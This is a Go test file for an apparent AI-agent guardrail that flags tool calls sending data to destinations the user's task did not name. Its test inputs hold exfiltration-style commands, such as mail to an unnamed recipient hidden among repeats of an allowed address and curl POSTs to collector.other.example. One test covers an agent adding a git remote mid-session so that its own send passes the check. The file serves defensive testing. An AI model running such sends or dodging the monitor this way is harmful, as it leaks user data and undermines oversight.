// Copyright 2026 Cisco Systems, Inc. and its affiliates
//
// Licensed under the Apache License, Version 2.0 (the "License");
// you may not use this file except in compliance with the License.
// You may obtain a copy of the License at
//
//     http://www.apache.org/licenses/LICENSE-2.0
//
// Unless required by applicable law or agreed to in writing, software
// distributed under the License is distributed on an "AS IS" BASIS,
// WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
// See the License for the specific language governing permissions and
// limitations under the License.
//
// SPDX-License-Identifier: Apache-2.0

package gateway

import (
	"fmt"
	"os"
	"path/filepath"
	"strings"
	"testing"

	"github.com/defenseclaw/defenseclaw/internal/actionfacts"
	"github.com/defenseclaw/defenseclaw/internal/config"
	"github.com/defenseclaw/defenseclaw/internal/guardrail/bounded"
)

// GAP-0341 (round 5 review, P2-1): a mail program's recipient scan is the capped
// scanner. N copies of the task's mailbox, then an unnamed one, in one argv word
// or in the here-document: the unnamed one is found whatever N is.
func TestIntentScopeMailRepeatsDoNotHideAnUnnamedRecipient(t *testing.T) {
	task := "mail ops@corp.example the summary"
	for _, n := range []int{3, 16, 17, 40} {
		repeats := strings.Repeat("ops@corp.example,", n)
		argv := map[string]any{"command": fmt.Sprintf("mail -s subj \"%sx@other.example\"", repeats)}
		if r := scopeReasonFor(t, task, "Bash", argv, ""); !strings.Contains(r, "does not name") {
			t.Errorf("argv word, %d copies then an unnamed recipient: %q", n, r)
		}
		doc := map[string]any{"command": fmt.Sprintf("sendmail -t <<'EOF'\nTo: %sx@other.example\nEOF", repeats)}
		if r := scopeReasonFor(t, task, "Bash", doc, ""); !strings.Contains(r, "does not name") {
			t.Errorf("here-document, %d copies then an unnamed recipient: %q", n, r)
		}
	}
	// only repeats of the named mailbox stay in scope
	same := map[string]any{"command": "mail -s subj \"" + strings.Repeat("ops@corp.example,", 40) + "ops@corp.example\""}
	if r := scopeReasonFor(t, task, "Bash", same, ""); r != "" {
		t.Errorf("copies of the named mailbox only: %q", r)
	}
	// a word too long for the parser is out of scope, never silently in
	many := map[string]any{"command": "mail -s subj \"" + strings.Repeat("ops@corp.example,", 1000) + "ops@corp.example\""}
	if r := scopeReasonFor(t, task, "Bash", many, ""); r == "" {
		t.Error("a very long recipient word must not be in scope")
	}
	// the scanner itself: more matches than the scan allows is a cap hit
	var trunc bounded.Truncated
	if got := scanScopeStrings(scopeShellEmailWord, strings.Repeat("a@b.example ", maxScopeScanMatches+5), &trunc); len(got) != maxScopeScanMatches || !trunc.Any() {
		t.Errorf("scan past the cap: %d matches, cap hit %v", len(got), trunc.Any())
	}
}

// P4-3: when actionfacts cannot project the call, every shell value is read, not
// the first alone.
func TestIntentScopeFallbackReadsEveryShellValue(t *testing.T) {
	r := &shellSendReader{trunc: new(bounded.Truncated), add: func(scopeDest) {}}
	// actionfacts could not project the call (invalid): the syntax fallback reads both values
	r.readFacts(actionfacts.Facts{Parse: actionfacts.ParseResult{Status: actionfacts.StatusInvalid}}, []string{"echo ok", "curl -d x \"https://$HOST/x\""}, 0)
	if !r.sends || !r.unreadable {
		t.Errorf("a sender in the second shell value was not read: sends=%v unreadable=%v", r.sends, r.unreadable)
	}
	r = &shellSendReader{trunc: new(bounded.Truncated), add: func(scopeDest) {}}
	r.readFacts(actionfacts.Facts{Parse: actionfacts.ParseResult{Status: actionfacts.StatusInvalid}}, []string{"echo ok", "ls -la"}, 0)
	if r.sends || r.unreadable {
		t.Errorf("no sender in any value: sends=%v unreadable=%v", r.sends, r.unreadable)
	}
}

// P4-1: a big call with no key a destination could sit under is not walked.
func TestIntentScopePrecheckSkipsBigCallsWithoutDestinationKeys(t *testing.T) {
	pad := strings.Repeat(`"x",`, scopeKeyPrecheckBytes/4+10)
	noKeys := `{"pad":[` + pad + `"x"]}`
	if scopeMayHaveDestination(noKeys) {
		t.Error("a call with no destination key must skip the walk")
	}
	if r := scopeReasonFor(t, "summarize the README", "email_send", map[string]any{"pad": strings.Split(strings.Repeat("x,", scopeKeyPrecheckBytes/2), ",")}, ""); r != "" {
		t.Errorf("a big call with no destination key: %q", r)
	}
	withKey := `{"pad":[` + pad + `"x"],"to":"x@other.example"}`
	if !scopeMayHaveDestination(withKey) {
		t.Error("a call with a sink key must be walked")
	}
	if r := scopeReasonFor(t, "summarize the README", "email_send", map[string]any{"pad": strings.Split(strings.Repeat("x,", scopeKeyPrecheckBytes/2), ","), "to": "x@other.example"}, ""); !strings.Contains(r, "does not name") && !strings.Contains(r, "bounded_truncated") {
		t.Errorf("a big call with a sink key must still be judged: %q", r)
	}
	if !scopeMayHaveDestination("not json at all") {
		t.Error("arguments that are not an object are always read")
	}
}

func scopeGitTestRepo(t *testing.T, remote string) string {
	t.Helper()
	repo := t.TempDir()
	if err := os.MkdirAll(filepath.Join(repo, ".git"), 0o755); err != nil {
		t.Fatal(err)
	}
	writeScopeGitConfig(t, repo, remote)
	return repo
}

func writeScopeGitConfig(t *testing.T, repo string, remotes ...string) {
	t.Helper()
	var b strings.Builder
	b.WriteString("[core]\n\trepositoryformatversion = 0\n")
	for i, url := range remotes {
		fmt.Fprintf(&b, "[remote \"r%d\"]\n\turl = %s\n", i, url)
	}
	if err := os.WriteFile(filepath.Join(repo, ".git", "config"), []byte(b.String()), 0o644); err != nil {
		t.Fatal(err)
	}
}

// P3-3: the git remotes are read once, at the session's first event; a remote the
// agent adds afterwards does not clear its own send.
func TestIntentScopeGitRemotesAreASessionSnapshot(t *testing.T) {
	repo := scopeGitTestRepo(t, "git@github.example:org/repo.git")
	j, ctx := scopeTestJudge("open a pull request for this branch")
	j.SnapshotSessionGitRemotes(ctx, repo)
	post := func(host string) string {
		return fmt.Sprintf(`{"command":"curl -sS -X POST https://%s/in -d '{}'"}`, host)
	}
	if r := j.scopeFloorReason(ctx, "Bash", post("api.github.example"), repo); r != "" {
		t.Errorf("the forge of the snapshot is in scope: %q", r)
	}
	// the agent adds a remote during the session
	writeScopeGitConfig(t, repo, "git@github.example:org/repo.git", "https://collector.other.example/x.git")
	j.ObserveSessionPromptScope(ctx, "continue", "continue")
	if r := j.scopeFloorReason(ctx, "Bash", post("collector.other.example"), repo); r == "" {
		t.Error("a remote added during the session cleared its own send")
	}
	if r := j.scopeFloorReason(ctx, "Bash", post("api.github.example"), repo); r != "" {
		t.Errorf("the snapshot host must stay in scope after a new prompt: %q", r)
	}
}

// A session whose first event is a tool call reads the remotes at that call, once.
func TestIntentScopeGitRemotesReadAtTheFirstToolCall(t *testing.T) {
	repo := scopeGitTestRepo(t, "git@github.example:org/repo.git")
	j, ctx := scopeTestJudge("open a pull request for this branch")
	call := `{"command":"curl -sS -X POST https://api.github.example/in -d '{}'"}`
	if r := j.scopeFloorReason(ctx, "Bash", call, repo); r != "" {
		t.Errorf("first tool call: %q", r)
	}
	writeScopeGitConfig(t, repo)
	if r := j.scopeFloorReason(ctx, "Bash", call, repo); r != "" {
		t.Errorf("the first read stands for the session: %q", r)
	}
	// no cwd means no read, and the session is not marked read
	writeScopeGitConfig(t, repo, "git@github.example:org/repo.git")
	j2, ctx2 := scopeTestJudge("open a pull request for this branch")
	if r := j2.scopeFloorReason(ctx2, "Bash", call, ""); r == "" {
		t.Error("with no cwd the forge is not named")
	}
	if r := j2.scopeFloorReason(ctx2, "Bash", call, repo); r != "" {
		t.Errorf("a later call with a cwd must still read the remotes once: %q", r)
	}
}

// P3-2: the OpenClaw router path records the shadow floor.
func TestRouterRecordsToolScopeFloorInShadow(t *testing.T) {
	seen := captureScopeShadow(t)
	j, ctx := scopeTestJudge("update the changelog")
	send := `{"url":"https://collector.other.example/in","body":"x"}`
	r := &EventRouter{}
	r.SetGuardrailConfig(&config.GuardrailConfig{})
	if reason := r.recordToolScopeFloor(j, ctx, "http_post", send); reason == "" || seen.count() != 1 {
		t.Errorf("shadow: reason %q, rows %d, want a reason and one row", reason, seen.count())
	}
	r.SetGuardrailConfig(&config.GuardrailConfig{Judge: config.JudgeConfig{IntentScope: config.IntentScopeOff}})
	if reason := r.recordToolScopeFloor(j, ctx, "http_post", send); reason != "" || seen.count() != 1 {
		t.Errorf("off: reason %q, rows %d, want none and still one row", reason, seen.count())
	}
	r.SetGuardrailConfig(&config.GuardrailConfig{Judge: config.JudgeConfig{IntentScope: config.IntentScopeAlert}})
	if reason := r.recordToolScopeFloor(j, ctx, "http_post", send); reason == "" || seen.count() != 1 {
		t.Errorf("alert (tests and harness only): reason %q, rows %d, want a reason and no new row", reason, seen.count())
	}
}
